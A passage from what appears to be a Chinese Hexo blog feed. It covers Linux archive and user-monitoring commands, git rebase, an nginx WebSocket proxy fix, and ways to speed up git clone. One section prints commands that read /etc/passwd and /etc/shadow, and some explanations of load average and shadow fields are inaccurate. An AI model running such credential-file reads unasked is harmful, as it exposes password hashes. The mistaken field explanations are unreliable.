-q *</span><br></pre></td></tr></table></figure><p>将指定文件目录的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q exmaple.zip &#x2F;tmp&#x2F;dir</span><br></pre></td></tr></table></figure><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>unzip 命令用于解压缩由 zip 命令压缩的“.zip”压缩包。</p><p>查看压缩文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -v dir.zip</span><br></pre></td></tr></table></figure><p>将压缩文件在当前目录下解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip example.zip</span><br></pre></td></tr></table></figure><p>将压缩文件<code>example.zip</code>在指定目录<code>/tmp</code>下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -n example.zip -d &#x2F;tmp</span><br></pre></td></tr></table></figure><p>将压缩文件<code>example.zip</code>在当前目<code>dir</code>下解压，如果已有相同的文件，不询问，直接覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -o example.zip -d</span><br></pre></td></tr></table></figure><p><code>-o</code> 参数表示不必先询问用户，unzip执行后覆盖原有的文件；<br><code>-d</code> 参数指定文件解压缩后所要存储的目录；<br><code>-n</code> 参数解压缩时不要覆盖原有的文件；</p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>tar 命令可以为linux 文件和目录创建档案。</p><p>利用tar命令，可以把一大堆的文件和目录全部打包成一个文件。</p><p>需要明确的两个概念是：打包和压缩是不同的两件事。</p><ul><li>打包：是指将一大堆文件或目录变成一个总的文件；</li><li>压缩：则是将一个大文件通过压缩算法变成一个小文件。</li></ul><p>为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>仅打包，不压缩。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf test.tar 20200323.log</span><br></pre></td></tr></table></figure><p><code>test.tar</code>这个文件名是自定义的，只是习惯上我们使用<code>.tar</code>作为包文件。</p><h3 id="打包并压缩"><a href="#打包并压缩" class="headerlink" title="打包并压缩"></a>打包并压缩</h3><p>打包，且压缩。<code>-z</code>参数表示以<code>.tar.gz</code>或者<code>.tgz</code>后缀名代表<code>gzip</code>压缩过的<code>tar</code>包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zcvf test.tar.gz 20200323.log</span><br></pre></td></tr></table></figure><p>打包，且压缩。<code>-j</code>参数表示以<code>.tar.bz2</code>后缀名作为<code>tar</code>包名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -jcvf test.tar.bz2 20200323.log</span><br></pre></td></tr></table></figure><h3 id="查看包内容"><a href="#查看包内容" class="headerlink" title="查看包内容"></a>查看包内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -ztvf test.tar.gz</span><br></pre></td></tr></table></figure><p>因为使用<code>gzip</code>命令压缩的<code>test.tar.gz</code>，所以查看压缩包时需要加上<code>-z</code>参数。</p><blockquote><p>如何只解压部分文件？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -ztvf test.tar.gz 20200323.log</span><br></pre></td></tr></table></figure><p>这种方式仅限于取一个文件。</p><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>在该目录下直接解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf test.tar.gz</span><br></pre></td></tr></table></figure><p>解压至指定文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf test.tar.gz -C log</span><br><span class="line">$ ls log</span><br><span class="line">20200323.log</span><br></pre></td></tr></table></figure><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p><code>.gz</code>压缩包（不带tar），需要使用gzip 命令去解压。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip test.gz -d &#x2F;&lt;filename&gt;</span><br></pre></td></tr></table></figure><p><code>-d</code> 参数用于指定解压位置</p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>如何查看Linux 的发行版本？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsb_release -a</span><br></pre></td></tr></table></figure><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>crontab 命令被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似。</p><h2 id="w"><a href="#w" class="headerlink" title="w"></a>w</h2><p>w命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。</p><p>不带任何参数，会显示当前登入系统的所有用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ w</span><br><span class="line"> 10:54:39 up 14 days, 22:39, 2 users,  load average: 0.18, 0.09, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">wangyh   pts&#x2F;0    113.87.129.118   10:27   25:10   2.77s  2.76s top</span><br><span class="line">Boo      pts&#x2F;1    113.87.129.118   10:54    1.00s  0.00s  0.00s w</span><br></pre></td></tr></table></figure><p>第一行显示的字段信息分别是：</p><ul><li><input checked="" disabled="" type="checkbox"> 10:50:39：系统当前时间</li><li><input checked="" disabled="" type="checkbox"> up 2:02： 系统已运行时间</li><li><input checked="" disabled="" type="checkbox"> 2 user：当前在线用户个数</li><li><input checked="" disabled="" type="checkbox"> load average：系统的平均负载，3个数值分别对应系统在过去的1,5,10分钟内的负载程度，数值越大，表明系统的负载越大。</li></ul><p>第二行几个字段分别表示：</p><ul><li><input checked="" disabled="" type="checkbox"> USER ： 登陆用户的账户名</li><li><input checked="" disabled="" type="checkbox"> TTY： 用户登陆所使用的终端</li><li><input checked="" disabled="" type="checkbox"> FROM： 显示用户从何处登陆，用户的IP地址</li><li><input checked="" disabled="" type="checkbox"> LOGIN@：显示用户登陆入系统时的时间</li><li><input checked="" disabled="" type="checkbox"> IDLE：用户空闲时长，从上一次该用户的任务结束后开始计时，以hour为单位</li><li><input checked="" disabled="" type="checkbox"> JCPU：表示在某段时间内，当前用户所有的进程任务所消耗的CPU时间</li><li><input checked="" disabled="" type="checkbox"> PCPU：表示在某段时间内，当前用户正在执行的进程任务所消耗的CPU时间</li><li><input checked="" disabled="" type="checkbox"> WHAT：表示用户正在执行的任务</li></ul><h2 id="who"><a href="#who" class="headerlink" title="who"></a>who</h2><p>who 命令用于查看目前登入系统的用户信息，与<code>w</code>命令类似。</p><p>显示当前登入系统中的所有用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ who</span><br><span class="line">wangyh   pts&#x2F;0        2019-04-19 10:27 (113.87.129.118)</span><br><span class="line">Boo      pts&#x2F;1        2019-04-19 10:54 (113.87.129.118)</span><br></pre></td></tr></table></figure><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><p><code>-m</code>：效果等同于执行<code>whoami</code>命令<br><code>-q或--count</code>：只显示登入系统的帐号名称和总人数；<br><code>-H</code>：增加显示用户信息状态栏</p><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><p>last 命令用于查看用户最近的登入信息</p><p>输出最后10 条登入信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ last -3</span><br><span class="line">Boo      pts&#x2F;1        113.87.129.118   Fri Apr 19 10:54   still logged in</span><br><span class="line">wangyh   pts&#x2F;0        113.87.129.118   Fri Apr 19 10:27   still logged in</span><br><span class="line">wangyh   pts&#x2F;5        113.87.129.118   Fri Apr 19 10:24 - 10:27  (00:02)</span><br></pre></td></tr></table></figure><p>查看指定用户的登入信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ last Boo -3</span><br><span class="line">Boo      pts&#x2F;1        113.87.129.118   Fri Apr 19 10:54   still logged in</span><br><span class="line">Boo      pts&#x2F;4        113.87.129.118   Fri Apr 19 10:23 - 10:26  (00:03)</span><br><span class="line">Boo      pts&#x2F;4        113.87.129.118   Fri Apr 19 10:14 - 10:22  (00:08)</span><br></pre></td></tr></table></figure><h2 id="pkill"><a href="#pkill" class="headerlink" title="pkill"></a>pkill</h2><p>pkill命令可以按照进程名杀死进程，可以用于踢出当前登入系统的用户。</p><h3 id="安全的踢出用户"><a href="#安全的踢出用户" class="headerlink" title="安全的踢出用户"></a>安全的踢出用户</h3><p>可以使用<code>pkill</code>命令踢出当前正登入系统中的用户，但是这么做很危险，更好的解决办法是：<br>先查看终端号，然后查看该终端执行的所有进程，根据进程号来停止服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef| grep pts&#x2F;0</span><br><span class="line">$ kill -9 pid</span><br></pre></td></tr></table></figure><h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><p>passwd 命令用于设置用户的认证信息，包括用户密码、密码过期时间等。</p><p>系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。</p><h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p>ss 命令用来显示处于活动状态的套接字信息。ss 命令可以用来获取socket 统计信息，它可以显示和netstat 类似的内容。但ss 的优势在于它能够显示更多更详细的有关TCP 和连接状态的信息，而且比netstat 更快速更高效。</p><p>显示所有的tcp 套接字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -t -a</span><br></pre></td></tr></table></figure><p>显示Socket 摘要</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -s</span><br></pre></td></tr></table></figure><p>列出所有打开的网络连接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -l</span><br></pre></td></tr></table></figure><p>找出打开套接字/端口应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -pl | grep 6666</span><br></pre></td></tr></table></figure><h2 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h2><p>存放用户信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;passwd</span><br><span class="line">$ cat &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p>用户信息文件分析（每项用:隔开）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jack:X:503:504:::&#x2F;home&#x2F;jack&#x2F;:&#x2F;bin&#x2F;bash</span><br><span class="line">jack　　&#x2F;&#x2F;用户名</span><br><span class="line">X　　&#x2F;&#x2F;口令、密码</span><br><span class="line">503　　&#x2F;&#x2F;用户id（0代表root、普通新建用户从500开始）</span><br><span class="line">504　　&#x2F;&#x2F;所在组</span><br><span class="line">:　　&#x2F;&#x2F;描述</span><br><span class="line">&#x2F;home&#x2F;jack&#x2F;　　&#x2F;&#x2F;用户主目录</span><br><span class="line">&#x2F;bin&#x2F;bash　　&#x2F;&#x2F;用户缺省Shell</span><br></pre></td></tr></table></figure><p>存放组信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;group</span><br><span class="line">cat &#x2F;etc&#x2F;gshadow</span><br></pre></td></tr></table></figure><p>用户组信息文件分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jack:$!$:???:13801:0:99999:7:*:*:</span><br><span class="line">jack　　&#x2F;&#x2F;组名</span><br><span class="line">$!$　　&#x2F;&#x2F;被加密的口令</span><br><span class="line">13801　　&#x2F;&#x2F;创建日期与今天相隔的天数</span><br><span class="line">0　　&#x2F;&#x2F;口令最短位数</span><br><span class="line">99999　　&#x2F;&#x2F;用户口令</span><br><span class="line">7　　&#x2F;&#x2F;到7天时提醒</span><br><span class="line">*　　&#x2F;&#x2F;禁用天数</span><br><span class="line">*　　&#x2F;&#x2F;过期天数</span><br></pre></td></tr></table></figure><p>如果是普通用户执行passwd只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用passwd用户名，注意要以root用户的权限来创建。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改boo 用户的密码</span><br><span class="line">$ passwd boo</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://www.cnblogs.com/peida/archive/2013/03/18/2965369.html#4235146" target="_blank" rel="noopener">Wget 命令</a></li><li><a href="http://man.linuxde.net/scp" target="_blank" rel="noopener">SCP 命令</a></li><li><a href="http://man.linuxde.net/last" target="_blank" rel="noopener">last 命令</a></li><li><a href="http://man.linuxde.net/who" target="_blank" rel="noopener">who 命令</a></li><li><a href="http://man.linuxde.net/pkill" target="_blank" rel="noopener">pkill 命令</a></li><li><a href="http://man.linuxde.net/ss" target="_blank" rel="noopener">ss 命令</a></li><li><a href="https://blog.csdn.net/kinggaiwusi/article/details/76919854" target="_blank" rel="noopener">permission denied,please try again</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Linux Commands </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 变基命令详解</title>
      <link href="/detailed-explanation-of-git-rebase-commands/"/>
      <url>/detailed-explanation-of-git-rebase-commands/</url>
      
        <content type="html"><![CDATA[<p>“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><p>问题描述：有时候我们在本地提交完代码，下一个操作是需要推送到远程仓库，这时如果远程仓库已经有了更新的提交，那么当我们执行完<code>git push</code> 命令之后，不出意外会出现以下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">! [rejected]        master -&gt; master (fetch first)</span><br><span class="line">error: failed to push some refs to &#39;git@gitlab.com:invest2&#x2F;invest_home.git&#39;</span><br><span class="line">hint: Updates were rejected because the remote contains work that you do</span><br><span class="line">hint: not have locally. This is usually caused by another repository pushing</span><br><span class="line">hint: to the same ref. You may want to first integrate the remote changes</span><br><span class="line">hint: (e.g., &#39;git pull ...&#39;) before pushing again.</span><br><span class="line">hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details.</span><br></pre></td></tr></table></figure><p>这时错误的意思是：推送失败，你需要先将远程仓库最新的提交更新到本地仓库，然后才能 <code>git push</code>。</p><p>所以这个时候你有两个选择：</p><ol><li>使用<code>git pull</code> 自动合并</li><li>使用<code>git fetch</code> 手动合并</li></ol><p>前者虽然用起来很方便，但是自动合并会留下一次合并记录，类似这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Merge branch &#39;master&#39; of bitbucket.org:maxt2013&#x2F;invest_home</span><br></pre></td></tr></table></figure><p>虽然这并不会影响什么，但如果你很重视 <code>commit logs</code>，那么这样的一次记录，是不被容忍的。</p><p>后者通过手动合并，确实可以做到没有多余的合并记录，但是每次手动合并有比较麻烦，那么有没有什么折中的方式，既可以不留下多余的记录，有比较省事。</p><p>答案是有的，它就是我们下面要介绍的“变基”。</p><h2 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h2><p>下面这条命令会将远程仓库中最新的提交合并到本地仓库，<code>--rebase</code>参数的作用是先取消 commit 记录，并把它们临时保存为补丁（patch），这些补丁放在 <code>.git/rebase</code>目录中，等远程仓库同步至本地之后，最后才将补丁合并到本地仓库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p>下面用图来解释具体发生了什么。</p><p><code>git pull</code> 之前的情况：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134641.png" alt=""></p><p>使用 <code>git pull --rebase origin</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134808.png" alt=""></p><p>最后使用 <code>git push</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134934.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>如果你对 <code>commit logs</code>有强烈的控制欲望，那么变基命令是适合你的，如果你是使用git 的新手，或者你不在意 <code>commit logs</code>，那么直接使用 <code>git pull</code> 自动合并就好了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/MBuger/article/details/70197532" target="_blank" rel="noopener">git push错误failed to push some refs to的解决</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socket.io 连接异常：Error during WebSocket handshake Unexpected response code 400</title>
      <link href="/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/"/>
      <url>/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/</url>
      
        <content type="html"><![CDATA[<p>前段时间线上的生产环境遇到一个问题：<code>Error during WebSocket handshake: Unexpected response code: 400</code>。</p><p>起初我没太在意，以为就是正常的 <code>socket.io</code> 连接断开了。</p><p>直到我发现 <code>socker.io</code> 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。</p><a id="more"></a><h2 id="nginx-作为wbsocket-代理"><a href="#nginx-作为wbsocket-代理" class="headerlink" title="nginx 作为wbsocket 代理"></a>nginx 作为wbsocket 代理</h2><p>经过一番查找，了解到 nginx 在作为反向代理时，如果需要使用 <code>wss</code>，那么还需要额外加一段配置。</p><blockquote><p>NGINX supports WebSocket by allowing a tunnel to be set up between a client and a backend server. For NGINX to send the Upgrade request from the client to the backend server, the Upgrade and Connection headers must be set explicitly.  —— Nginx 官网</p></blockquote><p>翻译过来就是：nginx 通过允许在客户端和后端服务器之间建立连接来支持 websocket 通讯，为了使 nginx 将升级请求从客户端发送到后端服务器，必须明确设置 Upgrade 和 Connection 标头。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">  proxy_pass http:&#x2F;&#x2F;wsbackend;</span><br><span class="line">  </span><br><span class="line">  proxy_http_version 1.1;</span><br><span class="line">  proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">  proxy_set_header Connection &quot;Upgrade&quot;;</span><br><span class="line">  proxy_set_header Host $host;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行是 nginx 反向代理的配置，后面四行才是这个问题的解决方案。</p><p>仔细想一想，因为本地没有 https 的概念，并没有发现这个问题，而线上是有配置证书的，所以暴露出了这个问题。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>socket.io</code> 的请求并没有真正达到，请求发出之后中间为什么没有到达节点，这个是解决问题的关键。</p><p>为了使 nginx 正确处理 <code>socket.io</code> 所需要做的就是正确设置标头，以处理将连接从 http 升级到 websocket 的请求。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.nginx.com/blog/websocket-nginx/" target="_blank" rel="noopener">Nginx 作为Websocket 反向代理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Socket.io </category>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
            <tag> Socket.io </tag>
            
            <tag> wss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Clone 太慢怎么办？</title>
      <link href="/what-should-I-do-if-git-clone-is-too-slow/"/>
      <url>/what-should-I-do-if-git-clone-is-too-slow/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在使用git 时，需要克隆<code>Bitbucket</code>的一个仓库，于是像往常一样打开了<code>iTerm</code>，便放在一边了。<br>直到一个小时后，我才想起来，想着应该克隆完了，打开才发现百分之一都没下载完。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908092611.png" alt="git clone 失败"></p><p>强大的长城技术对GitHub、Bitbucket 这类源代码托管服务平台网开一面，并没有像Google、FaceBook那样直接一刀切，但是它做了严格的限速，这种折磨简直比无法访问更难受。</p><p>上图中<code>git clone</code>的速度从来没有超过 <code>10k/s</code>，这也就意味着一个 <code>100M</code> 的项目，需要近三个小时才能下载完，而且由于网络的不稳定性，下载过程中偶尔会出现断开连接的情况，由于<code>git clone</code> 不支持端点续传，这就会导致前几个小时的下载量完全浪费掉了，只能重新开始下载。</p><p>这篇文章主要用来介绍几种方式可以快速的克隆远程仓库。</p><h3 id="浅复制"><a href="#浅复制" class="headerlink" title="浅复制"></a>浅复制</h3><p><code>git clone</code>默认会下载项目的完整历史版本，如果你只关心代码，而不关心历史信息，那么可以使用 git 的浅复制功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;bcit-ci&#x2F;CodeIgniter.git</span><br></pre></td></tr></table></figure><p><code>--depth=1</code> 表示只下载最近一次的版本，使用浅复制可以大大减少下载的数据量，例如，CodeIgniter 项目完整下载有近 100MiB ，而使用浅复制只有 5MiB 多，这样即使在恶劣的网络环境下，也可以快速的获得代码。</p><p>如果之后又想获取完整历史信息，可以使用下面的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch --unshallow</span><br></pre></td></tr></table></figure><p>或者，如果你只想下载最新的代码，你也可以直接从远程仓库下载打包好的<code>zip</code>文件，这会比浅复制更快，因为它只包含了最新的代码文件，而且<code>zip</code>是压缩文件。但是很显然，使用浅复制会灵活一些。</p><h3 id="GUI-工具"><a href="#GUI-工具" class="headerlink" title="GUI 工具"></a>GUI 工具</h3><p>如果你有幸正在使用代理，懂得如何科学上网的话，那么访问<code>GitHub</code>、<code>Bitbucket</code>对你来说应该不在话下。</p><p>从源代码托管服务平台下载项目最简单的方法就是使用一款图形化界面（<code>GUI</code>）的Git工具。</p><p>使用<code>GUI</code>工具方便之处就在于，可以在设置中直接配置是否使用代理。或者直接将代理配置尾系统代理。</p><h3 id="http-https-proxy"><a href="#http-https-proxy" class="headerlink" title="http/https proxy"></a>http/https proxy</h3><p>如果你跟我一样，更喜欢使用原生的<code>git</code>命令，喜欢使用在命令行下操作的那种感觉，那么你也可以在命令行下直接配置代理。</p><p>这里也有两种方式，根据实际情况自行选择。</p><h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">$ git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087</span><br></pre></td></tr></table></figure><p>或者直接编辑<code>~/.gitconifg</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.gitconfig</span><br><span class="line"></span><br><span class="line">[http]</span><br><span class="line">proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">[https]</span><br><span class="line">proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087</span><br></pre></td></tr></table></figure><h4 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086</span><br><span class="line">$ git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086</span><br></pre></td></tr></table></figure><p>其中，<code>1087</code>、<code>1086</code>分别是你本地机器的 <code>http</code>、<code>socks5</code>代理的端口号。 </p><p>另外，如果想取消设置，可以输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global --unset http.proxy</span><br><span class="line">$ git conifg --global --unset https.proxy</span><br></pre></td></tr></table></figure><p>配置完成后，重新 <code>clone</code>一遍，可以看到速度得到了极大的提升。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908092634.png" alt="git clone 成功"></p><blockquote><p>注意⚠️</p></blockquote><p>上面这种配置方式仅适用于 <code>https</code>协议，如果你在<code>clone</code>时选择<code>ssh</code>协议，那么速度仍然会很慢。</p><h3 id="替换域名"><a href="#替换域名" class="headerlink" title="替换域名"></a>替换域名</h3><p>如果你觉得上面的方式太麻烦了，或者是你没有代理，那么可以试试下面这种方式。</p><p>这种方式简单暴力，替换就可以直接使用，使用规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 原地址</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;996icu&#x2F;996.ICU.git</span><br><span class="line"></span><br><span class="line"># 替换成</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;996icu&#x2F;996.ICU.git</span><br></pre></td></tr></table></figure><p>只需要在<code>github.com</code>后面追加一个<code>.cnpmjs.org</code>就可以了。</p><p>以上就是<code>git clone</code>太慢时的各种解决办法。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.aneasystone.com/archives/2015/08/git-clone-faster.html" target="_blank" rel="noopener">Git Clone 太慢怎么办？</a></p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Skill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让终端命令走代理？</title>
      <link href="/how-to-make-terminal-commands-go-through-proxy/"/>
      <url>/how-to-make-terminal-commands-go-through-proxy/</url>
      
